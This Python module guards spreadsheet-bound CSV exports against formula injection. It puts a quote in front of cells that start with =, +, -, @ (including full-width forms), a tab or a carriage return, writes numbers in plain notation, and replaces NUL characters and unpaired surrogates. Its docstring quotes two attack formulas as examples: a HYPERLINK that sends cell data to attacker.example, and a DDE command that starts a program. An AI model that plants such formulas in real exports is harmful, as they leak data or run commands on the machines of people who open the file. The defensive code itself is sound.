"""Formula-injection protection for text written to spreadsheet-bound exports (brief Part B.5).

Threat: CSV formula injection (also called CSV or DDE injection). A spreadsheet application
that opens a CSV file treats a cell whose text starts with ``=``, ``+``, ``-`` or ``@`` as a
formula, and some applications skip leading whitespace, a tab or a carriage return before
deciding. Our exports contain untrusted text: cell values from uploaded documents, column
headers, sheet names, and issue texts that quote them. Without protection a cell such as
``=HYPERLINK("https://attacker.example/?"&A1, "Details")`` leaks data when clicked,
``=cmd|' /C calc'!A0`` asks Excel to start a program through DDE, and ``-2+3`` silently turns
into ``1``.

Defence (OWASP recommendation): a text value that a spreadsheet could read as a formula gets
a single quote (``'``) in front, so spreadsheets show it as text. The rule, applied by
:func:`neutralize_formula`:

* the text starts with a tab or a carriage return, or
* its first character after leading whitespace, invisible format characters (Unicode
  category ``Cf``, e.g. a zero-width space or a byte-order mark) and NUL characters is one
  of ``=``, ``+``, ``-`` or ``@``, or their full-width forms ``＝``, ``＋``, ``－``, ``＠``
  (East Asian input methods produce them, and some spreadsheet locales accept them).

Numbers are never prefixed, so negative amounts stay numbers: :func:`csv_value` writes a
``Decimal`` or ``int`` in plain notation (``format(value, "f")``, never an exponent), and a
string flagged as a number only when it already is a plain decimal literal (``-12.50``).
Anything else is treated as text, so the number flag can never let a formula through.

:func:`csv_value` also replaces NUL characters and unpaired surrogates with U+FFFD (the
Unicode replacement character): NUL makes several CSV readers stop or truncate a cell, and a
lone surrogate cannot be encoded as UTF-8. The replacement keeps a visible trace instead of
silently dropping a character.

Known residual risk: the rule protects the start of a field. A spreadsheet that splits the
comma-separated file at another delimiter (Excel with a ``;`` list separator, as in German
regional settings, opening the file by double click) can start a field in the middle of a
text. Importing through the spreadsheet's text import with the comma delimiter avoids that.
"""

from __future__ import annotations

import re
import unicodedata
from decimal import Decimal

QUOTE_PREFIX = "'"
REPLACEMENT_CHARACTER = "�"

# Characters that make a spreadsheet read the cell as a formula (ASCII and full-width forms).
FORMULA_TRIGGERS: frozenset[str] = frozenset("=+-@＝＋－＠")
# A text starting with one of these is prefixed whatever follows.
LEADING_CONTROL_TRIGGERS: frozenset[str] = frozenset("\t\r")

_PLAIN_NUMBER = re.compile(r"-?[0-9]+(?:\.[0-9]+)?")
_UNSAFE_CHARACTERS = re.compile("[\x00\ud800-\udfff]")


def _is_skipped_leading(char: str) -> bool:
    """Characters a spreadsheet may ignore before the first visible one."""
    return char.isspace() or char == "\x00" or unicodedata.category(char) == "Cf"


def needs_formula_prefix(text: str) -> bool:
    """True when a spreadsheet could read ``text`` as a formula (see the module docstring)."""
    if not text:
        return False
    if text[0] in LEADING_CONTROL_TRIGGERS:
        return True
    for char in text:
        if not _is_skipped_leading(char):
            return char in FORMULA_TRIGGERS
    return False


def neutralize_formula(text: str) -> str:
    """``text`` with a single quote in front when a spreadsheet could read it as a formula;
    any other text is returned unchanged."""
    return QUOTE_PREFIX + text if needs_formula_prefix(text) else text


def is_plain_number(text: str) -> bool:
    """True for a plain decimal literal such as ``12``, ``-12.50`` or ``0.001`` (ASCII digits,
    an optional leading minus, an optional fraction; no exponent, grouping or spaces)."""
    return _PLAIN_NUMBER.fullmatch(text) is not None


def clean_text(text: str) -> str:
    """``text`` with NUL characters and unpaired surrogates replaced by U+FFFD."""
    return _UNSAFE_CHARACTERS.sub(REPLACEMENT_CHARACTER, text)


def plain_decimal(value: Decimal | int) -> str:
    """A finite number in plain notation (``Decimal("1E+3")`` gives ``"1000"``)."""
    if isinstance(value, bool) or not isinstance(value, Decimal | int):
        raise TypeError(f"expected a Decimal or int, got {type(value).__name__}")
    if isinstance(value, int):
        return str(value)
    if not value.is_finite():
        raise ValueError("non-finite numbers cannot be exported")
    return format(value, "f")


def csv_value(value: str | Decimal | int | None, *, is_number: bool) -> str:
    """The text of one CSV cell.

    * ``None`` is an empty cell.
    * ``is_number=True``: a ``Decimal`` or ``int`` is written in plain notation, and a string
      as it is when it is a plain decimal literal; neither gets a prefix. A string that is not
      a plain decimal literal is handled as text.
    * ``is_number=False``: the value must be a string; it is cleaned (:func:`clean_text`) and
      neutralized (:func:`neutralize_formula`).
    """
    if value is None:
        return ""
    if is_number:
        if isinstance(value, str):
            return value if is_plain_number(value) else neutralize_formula(clean_text(value))
        return plain_decimal(value)
    if not isinstance(value, str):
        raise TypeError(f"text cells need a str, got {type(value).__name__}; numbers use is_number")
    return neutralize_formula(clean_text(value))
